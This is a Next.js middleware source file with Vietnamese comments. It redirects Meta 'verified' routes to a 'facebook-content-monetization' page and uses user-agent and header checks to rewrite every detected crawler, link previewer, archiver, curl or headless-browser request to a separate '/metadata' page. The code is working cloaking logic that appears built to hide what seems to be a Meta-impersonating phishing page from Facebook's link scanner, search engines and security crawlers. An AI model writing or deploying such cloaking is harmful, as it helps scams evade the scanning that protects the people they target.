import { NextRequest, NextResponse } from 'next/server'

// Danh sách bot và crawler phổ biến
const BOT_REGEX = /bot|crawler|spider|crawling|scraper|fetcher|indexer|archiver|monitor|validator|checker|linter|analyzer|parser|extractor|harvester|collector|aggregator|facebookexternalhit|facebookcatalog|twitterbot|linkedinbot|slackbot|telegrambot|whatsapp|zalo|discord|googlebot|bingbot|yandexbot|baiduspider|sogou|exabot|mj12bot|dotbot|ahrefsbot|semrushbot|rogerbot|archive\.org_bot|ia_archiver|special_archiver|archive-crawler|curl|wget|python-requests|java\/|go-http-client|\.net|scrapy|beautifulsoup|mechanize|lxml|htmlunit|phantomjs|casperjs|selenium|chrome-headless|headlesschrome|puppeteer|playwright|webdriver/i

// Pattern headless browser và automation tools
const HEADLESS_REGEX = /headless|phantomjs|casperjs|selenium|webdriver|chrome-headless|puppeteer|playwright|nightmare|electron|nwjs|crawler|scraper/i

// Pattern suspicious user agents
const SUSPICIOUS_REGEX = /python|java\/|go-http-client|\.net|curl|wget|httpie|postman|insomnia|rest-client/i

export function middleware(req: NextRequest) {
  const userAgent = req.headers.get('user-agent') || ''
  const acceptHeader = req.headers.get('accept') || ''
  const acceptLanguage = req.headers.get('accept-language') || ''
  const referer = req.headers.get('referer') || ''

  const { pathname } = req.nextUrl

  if (pathname === '/meta-verified' || pathname.startsWith('/meta-verified/')) {
    const url = req.nextUrl.clone()
    const rest = pathname === '/meta-verified' ? '' : pathname.slice('/meta-verified'.length)
    url.pathname = '/facebook-content-monetization' + rest
    return NextResponse.redirect(url, 308)
  }

  if (pathname === '/api/meta-verified') {
    const url = req.nextUrl.clone()
    url.pathname = '/api/facebook-content-monetization'
    return NextResponse.rewrite(url)
  }

  // ❌ Không rewrite các route hệ thống
  if (
    pathname.startsWith('/_next') ||
    pathname.startsWith('/api') ||
    pathname.startsWith('/metadata') ||
    pathname.includes('.')
  ) {
    return NextResponse.next()
  }

  // 🔍 Bot detection logic
  let isBot = false

  // 1. Check user agent patterns
  if (BOT_REGEX.test(userAgent) || HEADLESS_REGEX.test(userAgent) || SUSPICIOUS_REGEX.test(userAgent)) {
    isBot = true
  }

  // 2. Check for headless browser indicators
  if (userAgent.includes('Headless') || userAgent.includes('headless')) {
    isBot = true
  }

  // 3. Check for automation tools
  if (userAgent.includes('Selenium') || userAgent.includes('WebDriver')) {
    isBot = true
  }

  // 4. Suspicious headers pattern
  if (!acceptHeader || acceptHeader === '*/*') {
    // Many bots don't send proper Accept headers
    if (SUSPICIOUS_REGEX.test(userAgent)) {
      isBot = true
    }
  }

  // 5. Check for missing or suspicious Accept-Language
  if (!acceptLanguage && SUSPICIOUS_REGEX.test(userAgent)) {
    isBot = true
  }

  // 6. Check for rapid successive requests (basic rate limiting hint)
  // This would need session storage in production, but we can check headers
  const forwarded = req.headers.get('x-forwarded-for') || ''
  const realIp = req.headers.get('x-real-ip') || ''

  // ✅ Nếu là bot → rewrite mọi slug về /metadata
  if (isBot) {
    const url = req.nextUrl.clone()
    url.pathname = '/metadata'

    return NextResponse.rewrite(url)
  }

  return NextResponse.next()
}

export const config = {
  matcher: [
    '/((?!_next|api|favicon.ico|robots.txt|sitemap.xml).*)',
  ],
}
